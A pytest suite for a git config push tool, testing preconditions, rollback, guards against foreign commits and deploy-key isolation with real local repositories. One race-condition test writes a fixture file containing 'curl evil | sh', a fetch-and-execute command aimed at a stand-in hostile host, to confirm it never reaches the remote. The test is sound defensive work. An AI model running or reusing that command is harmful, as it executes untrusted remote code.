"""The config write path (push.py): precondition, commit, classify, guard, push, roll back.

These build real git repositories on disk (a bare "remote" plus a working clone) rather
than mocking subprocess, because every guard here is a statement about what git actually
reports — an assertion against a mock would pass just as happily if the argv were wrong.
No network: the remote is a local bare repo, so no deploy key is exercised. Where a
failure has to be injected (a rejected push, a concurrent commit), it is done with a real
pre-receive hook or a real commit, not a faked return code, wherever git allows it.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest
import yaml

from doc_cache_mcp import push as push_mod
from doc_cache_mcp.push import (
    GitTarget,
    PushRefused,
    classify_change,
    commit_change,
    emit_audit_event,
    identity_args,
    inspect_push_range,
    precondition,
)

IDENT_NAME = "doc-cache-mcp"
IDENT_EMAIL = "doc-cache-mcp@forge"
CONFIG_REL = "scripts/doc-sync.yml"
BASE = "services:\n  a:\n  - topic: t\n    url: https://docs.example.com/a\n"


def _run(repo: Path, *args: str) -> str:
    r = subprocess.run(["git", "-C", str(repo), *args], capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, f"git {' '.join(args)} failed: {r.stderr}"
    return r.stdout


def _commit(repo: Path, path: str, content: str, *, name: str, email: str, msg: str) -> None:
    f = repo / path
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(content)
    _run(repo, "add", "--", path)
    _run(repo, "-c", f"user.name={name}", "-c", f"user.email={email}", "commit", "-m", msg)


def _human(repo: Path, path: str, content: str, msg: str = "human") -> None:
    _commit(repo, path, content, name="Ted", email="ted@example.com", msg=msg)


@pytest.fixture
def bare(tmp_path) -> Path:
    b = tmp_path / "remote.git"
    subprocess.run(["git", "init", "--bare", "-b", "main", str(b)], check=True, capture_output=True)
    return b


@pytest.fixture
def repo(tmp_path, bare) -> Path:
    """A working repo whose `origin` is a local bare repo, already in sync."""
    work = tmp_path / "work"
    subprocess.run(["git", "init", "-b", "main", str(work)], check=True, capture_output=True)
    _run(work, "remote", "add", "origin", str(bare))
    _human(work, CONFIG_REL, BASE, "initial")
    _run(work, "push", "-u", "origin", "main")
    (work / ".fake-key").write_text("not-a-real-key")
    (work / ".git" / "info" / "exclude").write_text(".fake-key\n")
    return work


def _target(repo: Path, **over) -> GitTarget:
    kw = dict(
        repo=repo,
        rel=CONFIG_REL,
        remote="origin",
        branch="main",
        identity_name=IDENT_NAME,
        identity_email=IDENT_EMAIL,
        push=True,
        deploy_key=repo / ".fake-key",
        audit_dir=None,
    )
    kw.update(over)
    return GitTarget(**kw)


def _add_text(extra: str = "b") -> str:
    return BASE + f"  {extra}:\n  - topic: t\n    url: https://docs.example.com/{extra}\n"


def _change(t: GitTarget, text: str, expected: str = "additive") -> dict:
    assert precondition(t) is None
    return commit_change(
        t, new_text=text, message="doc-cache: test", expected=expected, service="svc"
    )


def _level(repo: Path) -> bool:
    return _run(repo, "rev-parse", "HEAD") == _run(repo, "rev-parse", "origin/main")


def _reject_pushes(bare: Path) -> None:
    hook = bare / "hooks" / "pre-receive"
    hook.write_text("#!/bin/sh\necho 'rejected by test hook' >&2\nexit 1\n")
    hook.chmod(0o755)


# --- identity ------------------------------------------------------------------------


def test_identity_args_are_per_invocation():
    assert identity_args("n", "e@x") == ["-c", "user.name=n", "-c", "user.email=e@x"]


# --- the happy path ------------------------------------------------------------------


def test_additive_change_is_pushed(repo):
    out = _change(_target(repo), _add_text())

    assert out["outcome"] == "pushed", out
    assert out["change"] == "additive"
    assert out["reason"] is None
    assert _run(repo, "rev-parse", "origin/main").strip() == out["sha"]
    assert _level(repo)
    assert _run(repo, "log", "-1", "--format=%ae").strip() == IDENT_EMAIL


def test_commit_is_path_limited(repo):
    """Something else staged in the live checkout must not be swept into the tool's commit."""
    (repo / "other.txt").write_text("staged by a human\n")
    _run(repo, "add", "other.txt")

    out = _change(_target(repo), _add_text())

    assert out["outcome"] == "pushed", out
    files = _run(repo, "show", "--name-only", "--format=", "HEAD").split()
    assert files == [CONFIG_REL]
    assert "A  other.txt" in _run(repo, "status", "--porcelain")


def test_identical_text_is_unchanged(repo):
    out = _change(_target(repo), BASE)
    assert out["outcome"] == "unchanged"
    assert _level(repo)


def test_push_disabled_is_committed_local(repo):
    t = _target(repo, push=False, deploy_key=None)
    out = _change(t, _add_text())
    assert out["outcome"] == "committed_local"
    assert "git_push=false" in out["reason"]
    assert not _level(repo)


# --- precondition: refuse before writing ---------------------------------------------


def test_behind_origin_is_refused_before_any_write(repo, tmp_path, bare):
    """The precondition the old path lacked: a stale checkout is named, and untouched."""
    other = tmp_path / "other"
    subprocess.run(["git", "clone", "-q", str(bare), str(other)], check=True)
    _human(other, "README", "x\n", "one")
    _human(other, "README", "y\n", "two")
    _run(other, "push", "-q", "origin", "main")
    before = (repo / CONFIG_REL).read_text()

    reason = precondition(_target(repo))

    assert reason and "2 behind" in reason and "origin/main" in reason, reason
    assert "sysadmin" in reason
    assert (repo / CONFIG_REL).read_text() == before


def test_unpushed_commit_is_refused(repo):
    """A stranded commit — the poisoned-range mechanism — stops the next call up front."""
    _human(repo, "README", "local only\n")
    reason = precondition(_target(repo))
    assert reason and "1 ahead of" in reason, reason


def test_dirty_config_is_refused(repo):
    (repo / CONFIG_REL).write_text(BASE + "# hand edit\n")
    reason = precondition(_target(repo))
    assert reason and "uncommitted changes" in reason


def test_dirty_config_is_refused_even_without_push(repo):
    (repo / CONFIG_REL).write_text(BASE + "# hand edit\n")
    assert "uncommitted changes" in precondition(_target(repo, push=False, deploy_key=None))


def test_wrong_branch_is_refused(repo):
    _run(repo, "checkout", "-q", "-b", "elsewhere")
    reason = precondition(_target(repo))
    assert reason and "elsewhere" in reason


def test_missing_deploy_key_is_refused(repo, tmp_path):
    reason = precondition(_target(repo, deploy_key=tmp_path / "nope"))
    assert reason and "deploy key not found" in reason


def test_unreachable_remote_is_refused(repo):
    _run(repo, "remote", "set-url", "origin", str(repo / "does-not-exist.git"))
    assert "cannot fetch" in precondition(_target(repo))


# --- push failure: roll back this call's commit --------------------------------------


def test_rejected_push_rolls_back_the_commit_and_the_file(repo, bare):
    pre = _run(repo, "rev-parse", "HEAD").strip()
    _reject_pushes(bare)

    out = _change(_target(repo), _add_text())

    assert out["outcome"] == "rolled_back", out
    assert out["sha"] is None
    assert "rejected" in out["reason"]
    assert _run(repo, "rev-parse", "HEAD").strip() == pre
    assert (repo / CONFIG_REL).read_text() == BASE
    assert _run(repo, "status", "--porcelain", "--", CONFIG_REL) == ""
    # And the next call is not poisoned: the checkout is clean and level again.
    assert precondition(_target(repo)) is None


def test_rollback_refuses_to_discard_a_concurrent_commit(repo, bare, monkeypatch):
    """The compare-and-swap: a commit landing between ours and the rollback survives.

    A ``git reset`` to the pre-call SHA here would silently drop the human's commit from the
    branch. The CAS fails instead, and the result says what is left where.
    """
    _reject_pushes(bare)
    real_git = push_mod._git
    fired = {"n": 0}

    def racing_git(repo_path, args, deploy_key=None):
        if args and args[0] == "update-ref" and not fired["n"]:
            fired["n"] = 1
            _human(repo_path, "README", "landed mid-rollback\n", "concurrent")
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", racing_git)
    out = _change(_target(repo), _add_text())

    assert fired["n"], "the race never triggered"
    assert out["outcome"] == "stranded", out
    assert "concurrent commit" in out["reason"]
    assert out["sha"]
    assert "concurrent" in _run(repo, "log", "-1", "--format=%s")
    # The stranded state is not silent for the next caller either.
    assert "ahead of" in precondition(_target(repo))


def test_push_timeout_that_did_not_land_rolls_back(repo, monkeypatch):
    real_git = push_mod._git

    def exploding_git(repo_path, args, deploy_key=None):
        if args and args[0] == "push":
            raise subprocess.TimeoutExpired(["git", "push"], 60)
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", exploding_git)
    out = _change(_target(repo), _add_text())  # must not raise

    assert out["outcome"] == "rolled_back", out
    assert "not on the remote" in out["reason"]
    assert _level(repo)


def test_push_timeout_that_did_land_is_pushed(repo, monkeypatch):
    real_git = push_mod._git

    def slow_git(repo_path, args, deploy_key=None):
        if args and args[0] == "push":
            real_git(repo_path, args, deploy_key)  # it lands, then the client times out
            raise subprocess.TimeoutExpired(["git", "push"], 60)
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", slow_git)
    out = _change(_target(repo), _add_text())

    assert out["outcome"] == "pushed", out
    assert _level(repo)


# --- change classification -----------------------------------------------------------


def _cfg(**services):
    return {"services": services}


A = {"topic": "t", "url": "https://x/a"}
B = {"topic": "u", "url": "https://x/b"}


def test_classify_change_kinds():
    assert classify_change(_cfg(s=[A]), _cfg(s=[A, B])) == "additive"
    assert classify_change(_cfg(s=[A]), _cfg(s=[A], n=[B])) == "additive"
    assert classify_change(None, _cfg(s=[A])) == "additive"
    assert classify_change(_cfg(s=[A]), _cfg(s=[{**A, "url": "https://x/z"}])) == "repoint"
    assert classify_change(_cfg(s=[A, B]), _cfg(s=[A])) == "remove"
    assert classify_change(_cfg(s=[A], n=[B]), _cfg(s=[A])) == "remove"
    assert classify_change(_cfg(s=[A]), _cfg(s=[{**A, "url": "https://x/z"}, B])) == "mixed"
    assert classify_change(_cfg(s=[A]), _cfg(s=[A])) == "none"


def test_change_of_the_wrong_kind_is_rolled_back(repo):
    """An add that would repoint (a bug in a caller) cannot land as an add."""
    repoint = BASE.replace("/a\n", "/elsewhere\n")
    out = _change(_target(repo), repoint, expected="additive")

    assert out["outcome"] == "rolled_back", out
    assert out["change"] == "repoint"
    assert "only makes 'additive'" in out["reason"]
    assert _level(repo)
    assert (repo / CONFIG_REL).read_text() == BASE


def test_repoint_pushes_when_it_is_the_expected_kind(repo):
    out = _change(_target(repo), BASE.replace("/a\n", "/elsewhere\n"), expected="repoint")
    assert out["outcome"] == "pushed", out
    assert out["change"] == "repoint"


def test_repoint_then_add_both_push_and_the_second_reason_is_its_own(repo):
    """The poisoned-range bug, end to end at the push layer (vikunja#653).

    v0.2.2: a repoint degraded to a review branch and stayed on local main, so the next,
    perfectly additive call's push range contained it — and that call degraded too, with a
    reason describing the repoint.
    """
    t = _target(repo)
    first = _change(t, BASE.replace("/a\n", "/elsewhere\n"), expected="repoint")
    second_text = yaml.safe_load((repo / CONFIG_REL).read_text())
    second_text["services"]["b"] = [{"topic": "t", "url": "https://docs.example.com/b"}]
    second = _change(t, yaml.safe_dump(second_text, sort_keys=False), expected="additive")

    assert first["outcome"] == "pushed", first
    assert second["outcome"] == "pushed", second
    assert second["reason"] is None
    assert second["change"] == "additive"
    assert _level(repo)


# --- guards on the push range --------------------------------------------------------


def _inspect(repo: Path):
    return inspect_push_range(
        repo,
        remote="origin",
        branch="main",
        allowed_path=CONFIG_REL,
        identity_email=IDENT_EMAIL,
        deploy_key=repo / ".fake-key",
    )


def test_foreign_commit_in_range_is_refused(repo):
    """Somebody else's unpushed work must not ride along."""
    _human(repo, "scripts/other.sh", "#!/bin/sh\n", "wip: unrelated")
    _commit(repo, CONFIG_REL, _add_text(), name=IDENT_NAME, email=IDENT_EMAIL, msg="add")
    with pytest.raises(PushRefused, match=r"not authored by this tool.*ted@example\.com"):
        _inspect(repo)


def test_commit_touching_another_path_is_refused(repo):
    _commit(repo, "scripts/evil.sh", "x\n", name=IDENT_NAME, email=IDENT_EMAIL, msg="c")
    with pytest.raises(PushRefused, match=r"scripts/evil\.sh"):
        _inspect(repo)


def test_mixed_commit_touching_allowed_and_disallowed_paths_is_refused(repo):
    (repo / "scripts" / "evil.sh").write_text("x\n")
    (repo / CONFIG_REL).write_text(_add_text())
    _run(repo, "add", "-A", "scripts")
    _run(repo, *identity_args(IDENT_NAME, IDENT_EMAIL), "commit", "-qm", "both")
    with pytest.raises(PushRefused, match="outside"):
        _inspect(repo)


def test_nothing_to_push_is_refused_plainly(repo):
    with pytest.raises(PushRefused, match="nothing to push"):
        _inspect(repo)


def test_guard_refusal_after_commit_rolls_back(repo, monkeypatch):
    """Defence in depth: if a guard ever trips after the commit, the commit is undone."""

    def refuse(*a, **k):
        raise PushRefused("synthetic guard refusal")

    monkeypatch.setattr(push_mod, "inspect_push_range", refuse)
    out = _change(_target(repo), _add_text())
    assert out["outcome"] == "rolled_back"
    assert out["reason"] == "synthetic guard refusal"
    assert _level(repo)


def test_commit_arriving_after_guard_evaluation_is_not_pushed(repo, monkeypatch):
    """Audit finding 1 (MEDIUM), reproduced rather than asserted.

    The guards inspect `remote/branch..HEAD`; pushing the `HEAD` *ref* would let a commit
    that landed in between ride along unchecked. The push sends the validated SHA.
    """
    real_git = push_mod._git
    injected = {"done": False}

    def racing_git(repo_path, args, deploy_key=None):
        if args and args[0] == "push" and not injected["done"]:
            injected["done"] = True
            _human(repo_path, "scripts/zz-slipped-in.sh", "curl evil | sh\n", "wip: window")
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", racing_git)
    out = _change(_target(repo), _add_text())

    assert injected["done"], "the race was never triggered"
    assert out["outcome"] == "pushed"
    remote_log = _run(repo, "log", "--format=%s", "origin/main")
    assert "wip: window" not in remote_log
    assert _run(repo, "rev-parse", "origin/main").strip() == out["sha"]


# --- credentials ---------------------------------------------------------------------


def test_git_env_withholds_the_ssh_agent_socket():
    """The deploy-key bound should hold structurally, not only via IdentitiesOnly."""
    from doc_cache_mcp.push import _git_env

    env = _git_env(Path("/tmp/key"))
    assert "SSH_AUTH_SOCK" not in env
    # Audit F-03: without -F /dev/null, IdentitiesOnly still offered ~/.ssh/config's
    # IdentityFile (the host user's account key) after the deploy key.
    assert env["GIT_SSH_COMMAND"].startswith("ssh -F /dev/null -i /tmp/key")
    assert "IdentitiesOnly=yes" in env["GIT_SSH_COMMAND"]
    leaky = [
        k for k in env if k != "GIT_SSH_COMMAND" and ("TOKEN" in k.upper() or "KEY" in k.upper())
    ]
    assert not leaky, leaky


def test_deploy_key_path_with_spaces_is_quoted():
    from doc_cache_mcp.push import _ssh_command

    assert "'/tmp/a key'" in _ssh_command(Path("/tmp/a key"))


# --- audit trail ---------------------------------------------------------------------


def test_audit_event_is_written(tmp_path):
    err = emit_audit_event(tmp_path, "pushed something", {"service": "svc"})
    assert err is None
    files = list(tmp_path.glob("*-cross-agent.jsonl"))
    assert len(files) == 1
    event = json.loads(files[0].read_text().strip())
    assert event["source"] == "doc-cache-mcp"
    assert event["event"] == "artifact.untracked"
    assert event["metadata"]["service"] == "svc"


def test_audit_event_name_is_settable(tmp_path):
    emit_audit_event(tmp_path, "x", {}, event="doc-cache.provisional.added")
    event = json.loads(next(tmp_path.glob("*.jsonl")).read_text())
    assert event["event"] == "doc-cache.provisional.added"


def test_audit_is_a_noop_when_unconfigured():
    assert emit_audit_event(None, "x", {}) is None


def test_audit_failure_is_reported_counted_and_not_swallowed(tmp_path, monkeypatch):
    """vikunja#380: a failing sink is an ERROR log plus a metric an alert can watch."""
    seen = []
    monkeypatch.setattr(push_mod, "emit_metric", lambda m, t, f: seen.append((m, f)))
    blocker = tmp_path / "blocked"
    blocker.write_text("i am a file, not a directory")

    err = emit_audit_event(blocker, "x", {})

    assert err and "audit event not written" in err
    assert seen == [("doc_cache_audit_sink_errors_total", {"count": 1})]


def test_result_surfaces_an_audit_failure_without_vetoing(repo, tmp_path):
    blocker = tmp_path / "blocked"
    blocker.write_text("not a dir")
    out = _change(_target(repo, audit_dir=blocker), _add_text())
    assert out["outcome"] == "pushed"
    assert "audit_error" in out


def test_every_decision_is_audited(repo, bare, tmp_path):
    audit = tmp_path / "audit"
    _change(_target(repo, audit_dir=audit), _add_text())
    _reject_pushes(bare)
    c = _add_text() + "  c:\n  - topic: t\n    url: https://docs.example.com/c\n"
    _change(_target(repo, audit_dir=audit), c)

    events = [json.loads(x) for x in next(audit.glob("*.jsonl")).read_text().splitlines()]
    assert [e["metadata"]["outcome"] for e in events] == ["pushed", "rolled_back"]
    assert all(e["metadata"]["change"] == "additive" for e in events)


# --- audit round 1 remediation ---------------------------------------------------------


def _config_host_with_identity() -> str | None:
    cfg = Path.home() / ".ssh" / "config"
    if not cfg.exists():
        return None
    host = None
    for line in cfg.read_text().splitlines():
        parts = line.strip().split(None, 1)
        if len(parts) == 2 and parts[0].lower() == "host" and "*" not in parts[1]:
            host = parts[1].split()[0]
        elif len(parts) == 2 and parts[0].lower() == "identityfile" and host:
            return host
    return None


def test_ssh_offers_only_the_deploy_key(tmp_path):
    """F-03, measured with ssh itself against this machine's real ~/.ssh/config.

    ssh finds its user config through the passwd entry, not $HOME, so this cannot be made
    hermetic. It skips where no Host block names an IdentityFile, and first checks that the
    pre-fix command DOES pick that key up, so a pass is not vacuous.
    """
    import shutil

    host = _config_host_with_identity()
    if shutil.which("ssh") is None or host is None:
        pytest.skip("no ssh, or no ~/.ssh/config Host block with an IdentityFile")
    key = tmp_path / "deploy"
    key.write_text("k")  # ssh -G drops an -i file that does not exist
    from doc_cache_mcp.push import _ssh_command

    def idents(cmd: str) -> list[str]:
        out = subprocess.run(
            [*cmd.split(), "-G", host], capture_output=True, text=True, timeout=10
        ).stdout
        return [x.split(" ", 1)[1] for x in out.splitlines() if x.startswith("identityfile ")]

    fixed = _ssh_command(key)
    assert len(idents(fixed.replace("-F /dev/null ", ""))) > 1, "pre-fix command not leaky here"
    assert idents(fixed) == [str(key)]


def test_rejected_push_that_actually_landed_is_reported_pushed(repo, monkeypatch):
    """F-07: a non-zero exit after the remote moved used to be rolled back locally."""
    real_git = push_mod._git

    def lying_git(repo_path, args, deploy_key=None):
        if args and args[0] == "push":
            real_git(repo_path, args, deploy_key)
            return subprocess.CompletedProcess(args, 1, "", "connection reset")
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", lying_git)
    out = _change(_target(repo), _add_text())
    assert out["outcome"] == "pushed", out
    assert _level(repo)


def test_rollback_leaves_a_staged_only_edit_alone(repo, bare, monkeypatch):
    """F-10: the worktree diff alone missed an edit that was staged, then reverted."""
    _reject_pushes(bare)
    real_git = push_mod._git
    fired = {"n": 0}

    def editing_git(repo_path, args, deploy_key=None):
        if args and args[0] == "update-ref" and not fired["n"]:
            fired["n"] = 1
            f = repo_path / CONFIG_REL
            keep = f.read_text()
            f.write_text(keep + "# staged by a human\n")
            _run(repo_path, "add", CONFIG_REL)
            f.write_text(keep)  # worktree matches the commit; index does not
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", editing_git)
    out = _change(_target(repo), _add_text())
    assert fired["n"]
    assert out["outcome"] == "stranded", out
    assert "edited after this call" in out["reason"]
    assert "# staged by a human" in _run(repo, "show", f":{CONFIG_REL}")


def test_git_timeout_kills_the_whole_process_group(tmp_path, monkeypatch):
    """F-07: subprocess.run(timeout=) killed git but left its ssh child running."""
    import time

    fake = tmp_path / "bin"
    fake.mkdir()
    pidfile = tmp_path / "child.pid"
    (fake / "git").write_text(f"#!/bin/sh\nsleep 30 &\necho $! > {pidfile}\nwait\n")
    (fake / "git").chmod(0o755)
    monkeypatch.setenv("PATH", f"{fake}:/usr/bin:/bin")
    monkeypatch.setattr(push_mod, "_GIT_TIMEOUT_S", 1)
    with pytest.raises(subprocess.TimeoutExpired):
        push_mod._git(tmp_path, ["push"])
    child = int(pidfile.read_text())
    time.sleep(0.2)
    with pytest.raises(ProcessLookupError):
        import os

        os.kill(child, 0)
